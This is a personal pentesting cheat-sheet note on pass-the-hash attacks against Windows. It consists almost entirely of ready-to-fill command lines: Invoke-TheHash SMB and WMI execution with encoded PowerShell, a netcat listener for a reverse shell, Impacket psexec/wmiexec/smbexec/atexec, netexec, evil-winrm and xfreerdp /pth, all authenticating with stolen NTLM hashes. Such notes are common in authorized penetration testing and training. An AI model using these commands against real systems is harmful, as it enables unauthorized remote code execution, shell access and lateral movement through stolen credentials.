---
Primary_category: "[[NTLM]]"
title: PASS THE HASH
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags: 
cssclasses: 
---

###### PRIMARY CATEGORY → [[NTLM]]

#### *Passing the Hash*

##### *Invoke-TheHash*

> ***[Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)***

***Reverse Shell***

- ***Import the Powershell Module***

```bash
Import-Module .\Invoke-TheHash.psm1
```

- ***Set a Listenting Port using Netcat***

```bash
rlwrap -CaR nc -nlvp 443
```

###### *Invoke-SMBExec*

```bash
Invoke-SMBExec -Target <TARGET> -Domain <DOMAIN> -Username <USERNAME> -Hash <NTLM_HASH> -Command "Powershell.exe -EncodedCommand <BASE64_COMMAND>"
```

###### *Invoke-WMIExec*

```bash
Invoke-WMIExec -Target <TARGET> -Domain <DOMAIN> -Username <USERNAME> -Hash <NTLM_HASH> -Command "Powershell.exe -EncodedCommand <BASE64_COMMAND>"
```

##### *Impacket*

> ***[Impacket](https://github.com/fortra/impacket)***

###### *PSExec.py*

> ***[PSExec.py](https://github.com/fortra/impacket/blob/master/examples/psexec.py)***

```bash
psexec.py -hashes :<NTLM_HASH> <DOMAIN>/<USERNAME>@<TARGET> <COMMAND> # Default Command → cmd.exe
```

###### *WMIExec.py*

> ***[WMIExec.py](https://github.com/fortra/impacket/blob/master/examples/wmiexec.py)***

```bash
wmiexec.py -hashes :<NTLM_HASH> <DOMAIN>/<USERNAME>@<TARGET> <COMMAND> # Default Command → Semi-Interactive Shell
```

###### *SMBExec.py*

> ***[SMBExec.py](https://github.com/fortra/impacket/blob/master/examples/smbexec.py)***

```bash
smbexec.py -hashes :<NTLM_HASH> <DOMAIN>/<USERNAME>@<TARGET> <COMMAND>
```

###### *ATExec.py*

> ***[ATExec.py](https://github.com/fortra/impacket/blob/master/examples/atexec.py)***

```bash
atexec.py -hashes :<NTLM_HASH> <DOMAIN>/<USERNAME>@<TARGET> <COMMAND>
```

##### *Netexec*

> ***[Netexec](https://github.com/Pennyw0rth/NetExec)***

```bash
nxc smb <TARGET> --username '<USERNAME>' --hash <NTLM_HASH> -x <COMMAND>
```

##### *Evil-WinRM*

> ***[Evil-WinRM](https://github.com/Hackplayers/evil-winrm)***

```bash
evil-winrm --user <USERNAME>@<DOMAIN_OR_WORKGROUP> --hash <NTLM_HASH> --ip <TARGET>
```

##### *XFreeRDP*

> ***[XFreeRDP](https://github.com/FreeRDP/FreeRDP)***

```bash
xfreerdp /u:<USERNAME> /pth:<NTLM_HASH> /v:<TARGET> /cert:ignore
```

###### *Restricted Admin Mode*

> ***[[DisableRestrictedAdminMode]]***

![[WINDOWS LATERAL MOVEMENT-20250519180656383.webp|350]]

> ***Zoom In***

***See [[DisableRestrictedAdminMode|here]]***